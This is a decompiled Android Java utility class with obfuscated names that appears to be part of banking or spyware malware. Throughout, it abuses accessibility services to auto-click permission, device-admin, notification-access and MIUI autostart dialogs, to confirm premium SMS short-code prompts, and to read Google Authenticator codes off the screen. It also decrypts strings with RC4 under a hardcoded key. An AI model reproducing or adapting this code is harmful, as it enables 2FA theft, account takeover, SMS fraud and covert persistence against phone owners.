package com.example.mmm.Utils;

import com.example.mmm.*;
import android.view.accessibility.*;
import android.graphics.*;
import android.accessibilityservice.*;
import android.os.*;
import com.example.mmm.API.*;
import android.util.*;
import java.util.*;
import android.content.*;

public final class utils2
{
    static utils declined$;
    constants florida$;
    
    static {
        utils2.declined$ = new utils();
    }
    
    public utils2() {
        super();
        this.florida$ = new constants();
    }
    
    static AccessibilityNodeInfo _selling(final AccessibilityEvent accessibilityEvent, final String s) {
        if (accessibilityEvent == null) {
            return null;
        }
        return _privacy(accessibilityEvent.getSource(), s);
    }
    
    private static void _acute(final int n, final int n2, final AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        if (accessibilityNodeInfo.getChildCount() != 0) {
            final Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (rect.contains(n, n2)) {
                accessibilityNodeInfo.performAction(16);
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
                _acute(n, n2, accessibilityNodeInfo.getChild(i));
            }
            return;
        }
        final Rect rect2 = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(rect2);
        if (rect2.contains(n, n2)) {
            accessibilityNodeInfo.performAction(16);
        }
    }
    
    public static void _plains(final AccessibilityService accessibilityService, final int n, final int n2) {
        if (Build$VERSION.SDK_INT > 16) {
            _acute(n, n2, accessibilityService.getRootInActiveWindow());
        }
    }
    
    public static void _batch(final AccessibilityNodeInfo accessibilityNodeInfo, final String s) {
        if (Build$VERSION.SDK_INT >= 18) {
            final Bundle bundle = new Bundle();
            bundle.putString("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", s);
            accessibilityNodeInfo.performAction(2097152, bundle);
        }
    }
    
    private static List _habitat(final AccessibilityNodeInfo accessibilityNodeInfo, final String s) {
        final ArrayList<AccessibilityNodeInfo> list = new ArrayList<AccessibilityNodeInfo>();
        if (accessibilityNodeInfo == null) {
            return list;
        }
        for (int childCount = accessibilityNodeInfo.getChildCount(), i = 0; i < childCount; ++i) {
            final AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                if (child.getClassName().toString().toLowerCase().contains(s.toLowerCase())) {
                    list.add(child);
                }
                else {
                    list.addAll(_habitat(child, s));
                }
            }
        }
        return list;
    }
    
    private static AccessibilityNodeInfo _privacy(final AccessibilityNodeInfo accessibilityNodeInfo, final String s) {
        final AccessibilityNodeInfo accessibilityNodeInfo2 = null;
        if (accessibilityNodeInfo == null) {
            return null;
        }
        AccessibilityNodeInfo accessibilityNodeInfo3 = accessibilityNodeInfo2;
        if (Build$VERSION.SDK_INT >= 18) {
            final List accessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(s);
            accessibilityNodeInfo3 = accessibilityNodeInfo2;
            if (accessibilityNodeInfosByViewId.size() > 0) {
                accessibilityNodeInfo3 = accessibilityNodeInfosByViewId.get(0);
            }
        }
        return accessibilityNodeInfo3;
    }
    
    public final String _roster(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    public final void _cornell(final Context context) {
        final Intent \u0131ntent = new Intent("miui.intent.action.APP_PERM_EDITOR");
        \u0131ntent.setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
        \u0131ntent.putExtra("extra_pkgname", context.getPackageName());
        \u0131ntent.setFlags(268435456);
        context.startActivity(\u0131ntent);
    }
    
    public final boolean _santa(final AccessibilityService accessibilityService, final AccessibilityEvent accessibilityEvent, final String s) {
        if (Build$VERSION.SDK_INT >= 18 && s.contains("com.google.android.permissioncontroller")) {
            utils2.declined$.Log("run", "for clicked com.android.packageinstaller.role.ui.requestroleactivity  ");
            if (accessibilityEvent.getSource() == null) {
                return false;
            }
            final Iterator<AccessibilityNodeInfo> iterator = (Iterator<AccessibilityNodeInfo>)_habitat(accessibilityEvent.getSource(), "android.widget.LinearLayout").iterator();
            int n = 0;
            while (iterator.hasNext()) {
                final AccessibilityNodeInfo accessibilityNodeInfo = iterator.next();
                int n2;
                for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i, n = n2) {
                    final AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                    n2 = n;
                    if (child.getText() != null) {
                        utils2.declined$.Log("=========", child.getText().toString());
                        n2 = n;
                        if (child.getText().toString().equals(utils2.declined$.getLabelApplication((Context)accessibilityService))) {
                            accessibilityNodeInfo.performAction(16);
                            n2 = 1;
                        }
                    }
                }
            }
        }
        return false;
    }
    
    public final boolean _shannon(final AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        utils2.declined$.Log("AccessibilityClickButton", accessibilityNodeInfo.toString());
        return accessibilityNodeInfo.performAction(16);
    }
    
    public final void _presence(final AccessibilityService accessibilityService, final AccessibilityEvent accessibilityEvent, String string) {
        if (Build$VERSION.SDK_INT >= 18 && string.contains("com.google.android.apps.authenticator2")) {
            utils2.declined$.Log("run", "com.google.android.apps.authenticator2");
            if (accessibilityEvent.getSource() == null) {
                return;
            }
            string = "";
            final Iterator<AccessibilityNodeInfo> iterator = (Iterator<AccessibilityNodeInfo>)_habitat(accessibilityEvent.getSource(), "android.view.ViewGroup").iterator();
            int n = 0;
            String s = string;
            while (iterator.hasNext()) {
                final AccessibilityNodeInfo accessibilityNodeInfo = iterator.next();
                for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i, s = string) {
                    final AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                    string = s;
                    if (child.getText() != null) {
                        final utils declined$ = utils2.declined$;
                        final StringBuilder sb = new StringBuilder();
                        sb.append("Line: ");
                        sb.append(n);
                        sb.append(", index: ");
                        sb.append(i);
                        declined$.Log(sb.toString(), child.getText().toString());
                        final StringBuilder sb2 = new StringBuilder();
                        sb2.append(s);
                        sb2.append("Line: ");
                        sb2.append(n);
                        sb2.append(", index: ");
                        sb2.append(i);
                        sb2.append(", text: ");
                        sb2.append(child.getText().toString());
                        sb2.append("\n");
                        string = sb2.toString();
                    }
                }
                ++n;
            }
            s.isEmpty();
        }
    }
    
    public final void _fires(final Context context) {
        final Intent \u0131ntent = new Intent();
        \u0131ntent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
        \u0131ntent.setFlags(268435456);
        context.startActivity(\u0131ntent);
    }
    
    public final boolean _phone(final AccessibilityEvent accessibilityEvent, final String s) {
        if (Build$VERSION.SDK_INT >= 18 && s.contains("com.miui.powerkeeper.ui.hiddenappsconfigactivity")) {
            utils2.declined$.Log("run", "for clicked3");
            utils.chalkTile(40);
            for (final AccessibilityNodeInfo accessibilityNodeInfo : _habitat(accessibilityEvent.getSource(), "android.widget.LinearLayout")) {
                for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
                    final AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                    if (child.getViewIdResourceName() != null && child.getViewIdResourceName().equals("android:id/title")) {
                        this._shannon(accessibilityNodeInfo);
                        return true;
                    }
                }
            }
        }
        return false;
    }
    
    public final void _tulsa(final Context context) {
        final Intent \u0131ntent = new Intent();
        \u0131ntent.setClassName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity");
        \u0131ntent.putExtra("package_name", context.getPackageName());
        \u0131ntent.putExtra("package_label", utils2.declined$.getLabelApplication(context));
        \u0131ntent.setFlags(268435456);
        context.startActivity(\u0131ntent);
    }
    
    public final boolean _bases(final AccessibilityService accessibilityService, final AccessibilityEvent accessibilityEvent, final String s) {
        if (Build$VERSION.SDK_INT >= 18 && s.contains("com.miui.permcenter.autostart.autostartmanagementactivity")) {
            utils2.declined$.Log("run", "for clicked2");
            utils.chalkTile(40);
            for (final AccessibilityNodeInfo accessibilityNodeInfo : _habitat(accessibilityEvent.getSource(), "android.widget.LinearLayout")) {
                int i = 0;
                int n = 0;
                while (i < accessibilityNodeInfo.getChildCount()) {
                    final AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                    int n2 = n;
                    if (child.getViewIdResourceName() != null) {
                        final utils declined$ = utils2.declined$;
                        final String s2 = "==============";
                        final StringBuilder sb = new StringBuilder();
                        sb.append("text: ");
                        sb.append((Object)child.getText());
                        sb.append("  id: ");
                        sb.append(child.getViewIdResourceName());
                        declined$.Log(s2, sb.toString());
                        n2 = n;
                        if (child.getText() != null) {
                            final boolean contains = utils2.declined$.getLabelApplication((Context)accessibilityService).contains(child.getText().toString());
                            n2 = n;
                            if (contains) {
                                n2 = 1;
                            }
                        }
                    }
                    ++i;
                    n = n2;
                }
            }
        }
        return false;
    }
    
    public final boolean _referral(final AccessibilityEvent accessibilityEvent, final String s) {
        if (Build$VERSION.SDK_INT >= 18 && s.contains("android.app.alertdialog")) {
            final AccessibilityNodeInfo source = accessibilityEvent.getSource();
            if (source == null) {
                return false;
            }
            final AccessibilityNodeInfo privacy = _privacy(source, "android:id/sms_short_code_remember_choice_checkbox");
            if (privacy != null) {
                this._shannon(privacy);
                final AccessibilityNodeInfo privacy2 = _privacy(source, "android:id/button1");
                if (privacy2 != null) {
                    this._shannon(privacy2);
                    return true;
                }
            }
        }
        return false;
    }
    
    public final boolean _console(final AccessibilityService accessibilityService, final AccessibilityEvent accessibilityEvent, final String s) {
        if (s.contains("com.android.settings.settings$notificationaccesssettingsactivity") && utils.isNotificationServiceEnabled((Context)accessibilityService)) {
            return true;
        }
        if (!utils.isNotificationServiceEnabled((Context)accessibilityService) && Build$VERSION.SDK_INT >= 18 && s.contains("com.android.settings.settings$notificationaccesssettingsactivity")) {
            utils2.declined$.Log("run", "for clicked3");
            for (final AccessibilityNodeInfo accessibilityNodeInfo : _habitat(accessibilityEvent.getSource(), "android.widget.LinearLayout")) {
                for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
                    final AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                    if (child.getText() != null && child.getText().equals("euwvxmpnqta")) {
                        this._shannon(accessibilityNodeInfo);
                        utils2.declined$.SettingsWrite((Context)accessibilityService, "SQ", "1");
                    }
                }
            }
        }
        return false;
    }
    
    public final boolean _obtain(final AccessibilityEvent accessibilityEvent, final String s) {
        if (Build$VERSION.SDK_INT >= 18) {
            if (accessibilityEvent.getSource() == null) {
                return false;
            }
            if (s.contains("com.android.settings.deviceadminadd")) {
                utils2.declined$.Log("run", "for clicked");
                final Iterator<AccessibilityNodeInfo> iterator = _habitat(accessibilityEvent.getSource(), "android.widget.LinearLayout").iterator();
                while (iterator.hasNext()) {
                    iterator.next().performAction(16);
                }
            }
        }
        return false;
    }
    
    public final boolean _declared(final AccessibilityService accessibilityService, final AccessibilityEvent accessibilityEvent, final String s) {
        if (Build$VERSION.SDK_INT >= 18) {
            final AccessibilityNodeInfo source = accessibilityEvent.getSource();
            if (source == null) {
                return false;
            }
            final AccessibilityNodeInfo privacy = _privacy(source, "android:id/text1");
            if (privacy != null) {
                this._shannon(privacy);
                utils2.declined$.Log("CLK", "GOOD CLICK!");
                utils2.declined$.SettingsWrite((Context)accessibilityService, "XB", "1");
                utils2.declined$._chapel((Context)accessibilityService);
                return true;
            }
            if (s.contains("com.miui.permcenter.permissions.permissionseditoractivity")) {
                utils2.declined$.Log("run", "for clicked");
                utils.chalkTile(40);
                final List habitat = _habitat(accessibilityEvent.getSource(), "android.widget.LinearLayout");
                final Iterator<AccessibilityNodeInfo> iterator = habitat.iterator();
                int n = 0;
                while (iterator.hasNext()) {
                    final AccessibilityNodeInfo accessibilityNodeInfo = iterator.next();
                    final int n2 = n + 1;
                    if (habitat.size() - 1 == (n = n2)) {
                        int n3 = 0;
                        while (true) {
                            n = n2;
                            if (n3 >= accessibilityNodeInfo.getChildCount()) {
                                break;
                            }
                            final AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(n3);
                            if (child.getViewIdResourceName() != null && child.getViewIdResourceName().equals("com.miui.securitycenter:id/action")) {
                                final utils declined$ = utils2.declined$;
                                final String s2 = "=======";
                                final StringBuilder sb = new StringBuilder();
                                sb.append(child.getViewIdResourceName());
                                declined$.Log(s2, sb.toString());
                                accessibilityNodeInfo.performAction(16);
                            }
                            ++n3;
                        }
                    }
                }
            }
        }
        return false;
    }
}
